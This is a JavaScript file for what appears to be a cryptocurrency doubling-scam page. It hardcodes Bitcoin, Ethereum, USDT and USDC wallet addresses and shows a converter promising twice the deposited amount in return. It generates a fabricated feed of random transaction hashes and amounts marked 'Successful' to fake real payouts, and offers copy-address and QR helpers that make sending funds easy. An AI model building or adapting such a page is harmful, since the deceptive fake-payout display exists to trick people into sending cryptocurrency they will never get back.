function fallbackCopyTextToClipboard(text) {
  var textArea = document.createElement("textarea");
  textArea.value = text;
  
  // Avoid scrolling to bottom
  textArea.style.top = "0";
  textArea.style.left = "0";
  textArea.style.position = "fixed";

  document.body.appendChild(textArea);
  textArea.focus();
  textArea.select();

  try {
    var successful = document.execCommand('copy');
    var msg = successful ? 'successful' : 'unsuccessful';
    console.log('Fallback: Copying text command was ' + msg);
  } catch (err) {
    console.error('Fallback: Oops, unable to copy', err);
  }

  document.body.removeChild(textArea);
}
function copyTextToClipboard(text) {
  if (!navigator.clipboard) {
    fallbackCopyTextToClipboard(text);
    return;
  }
  navigator.clipboard.writeText(text).then(function() {
    console.log('Async: Copying to clipboard was successful!');
  }, function(err) {
    console.error('Async: Could not copy text: ', err);
  });
}

function getRandomArbitrary(min, max) {
    return Math.random() * (max - min) + min;
}

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

function randomString(length, voca) {
    let result = '';
    const characters = voca || 'ABCDEFabcdef0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
}

function leadingZero(num) {
	if (num < 10) return "0"+num;
	return num;
}

document.addEventListener("alpine:init", () => {
    Alpine.data("app", () => ({
    	coins: {
    		btc: {
    			wallet: "bc1q0req60msgy39vpqvaflqyesxu8rzmm3w9hpph6",
    			coin: "BTC",
    			full: "Bitcoin",
    			min: 0.1,
    			max: 250,
    		},
    		eth: {
    			wallet: "0x2882bc7746971fFEa5F89F5A66D638EDefb105CD",
    			coin: "ETH",
    			full: "Etherium",
    			min: 0.5,
    			max: 4500
    		},
    		usdterc: {
    			wallet: "0x2882bc7746971fFEa5F89F5A66D638EDefb105CD",
    			coin: "USDT ERC20",
    			full: "USDT ERC20",
    			min: 1000,
    			max: 5000000,
    		},
    		usdttrc: {
    			wallet: "TLRF2DrtGtRRARep84byJeNrto5kmqoMqs",
    			coin: "USDT TRC20",
    			full: "USDT TRC20",
    			min: 1000,
    			max: 5000000,
    		},
    		usdc: {
    			wallet: "0x2882bc7746971fFEa5F89F5A66D638EDefb105CD",
    			coin: "USDC",
    			full: "USD Coin",
    			min: 1000,
    			max: 5000000,
    		},
    	},
    	key: "btc",
    	current: {},
        appNumber: "35249d68-5bb7-49f7-b095-62f50cb07c76",
        amount: 0,
        rows: [],
        init() {
        	this.current = this.coins.btc;
            for(let i = 0; i < 6; i++) {
            	this.rows.push(this.generateRow())
            }
            
            setInterval(() => {
            	this.rows.pop();
            	this.rows.unshift(this.generateRow())
            }, 5000);
        },
        textMin(x=1) {
        	return numberWithCommas(this.current.min*x)+" "+this.current.coin;
        },
        textMax(x=1) {
        	return numberWithCommas(this.current.max*x)+" "+this.current.coin;
        },
        generateRow() {
        	const row = {};
			const today = new Date();

        	row.hash = randomString(40) + "...";
        	row.time = leadingZero(today.getHours()) + ":" + leadingZero(today.getMinutes());
        	row.amount = {};
        	let rand = getRandomInt(1,5);
        	if (rand == 1) {
        		row.amount = numberWithCommas(getRandomArbitrary(this.coins.btc.min,this.coins.btc.max).toFixed(2));
        		row.coin = this.coins.btc.coin;
        	}
        	if (rand == 2) {
        		row.hash = "0x"+randomString(40) + "...";
        		row.amount = numberWithCommas(getRandomArbitrary(this.coins.eth.min,this.coins.eth.max).toFixed(2));
        		row.coin = this.coins.eth.coin;
        	}
        	if (rand == 3) {
        		row.amount = numberWithCommas(getRandomArbitrary(this.coins.usdterc.min,this.coins.usdterc.max).toFixed(2));
        		row.coin = this.coins.usdterc.coin;
        	}
        	if (rand == 4) {
        		row.amount = numberWithCommas(getRandomArbitrary(this.coins.usdttrc.min,this.coins.usdttrc.max).toFixed(2));
        		row.coin = this.coins.usdttrc.coin
        	}
        	if (rand == 5) {
        		row.amount = numberWithCommas(getRandomArbitrary(this.coins.usdc.min,this.coins.usdc.max).toFixed(2));
        		row.coin = this.coins.usdc.coin;
        	}
        	rand = getRandomInt(1,2);
        	if (rand == 1) {
        		row.status = "success"
        	}
        	if (rand == 2) {
        		row.status = "confirmation"
        	}
        	return row;
        },
        status(row) {
        	if (row.status =="success") {
        		return '<div class="status success">Successful</div>';
        	} else {
        		return '<div class="status info">1 Confirmations</div>';
        	}
        },
        rowAmount(row) {
        	return `<td>${row.amount} <span>${row.coin}</span></td>`
        },
        tab: {
        	["@click"](){
        		const coin = this.$el.dataset.coin;
        		this.current = this.coins[coin];
        		this.key = coin;
        		this.amount = 0;
        		this.$refs.amount1.value = "";
        		this.$refs.amount2.value = "";
        	},
        	[":class"]() {
        		if (this.$el.dataset.coin == this.key) return "on";
        	}
        },
        amount1: {
        	["@input"]() {
    			const val = this.$el.value;
    			let result;
    			if (!isNaN(val)) result = (val * 2);
    			if (isNaN(val) || val == 0) result = "";
    			this.$refs.amount2.value = result;
    			this.amount = val;
        	}
        },
        amount2: {
        	["@input"]() {
        		const val = this.$el.value;
    			let result;
    			if (!isNaN(val)) result = (val / 2);
    			if (isNaN(val) || val == 0) result = "";
    			this.$refs.amount1.value = result;
    			this.amount = result;
        	}
        },
        amountVal: {
        	["x-html"]() {
        		if (this.amount<this.current.min){
        			return `<span class="errorText"> The minimum value allowed is ${this.current.min}</span><span>${this.current.coin}</span>`
        		} else {
        			return `<div class="value"> ${this.amount} </div> <span>${this.current.coin}</span>`;
        		}
        	}
        },
        copyAddress: {
        	["@click"]() {
        		copyTextToClipboard(this.current.wallet);
        		this.$el.textContent = "Copied!"
        	}
        },
        copyAmount: {
	        ["@click"]() {
	        	copyTextToClipboard(this.amount);
	        	this.$el.textContent = "Copied!"
	        }	
        },
        icon: {
        	[":src"]() {
        		if (this.key == "btc") return "assets/btc.svg";
        		if (this.key == "eth") return "assets/eth.svg";
        		if (this.key == "usdterc") return "assets/usdterc.png";
        		if (this.key == "usdttrc") return "assets/usdttrc.png";
        		if (this.key == "usdc") return "assets/usdc.png";
        	}
        },
        qr: {
        	["x-html"]() {
        		return new QRCode({content:this.current.wallet,padding:0,width:132,height:132,color:"#000000",background:"#ffffff",join:true,ecl:"L"}).svg();
        	}
        },
        table: {

        }
    }))
})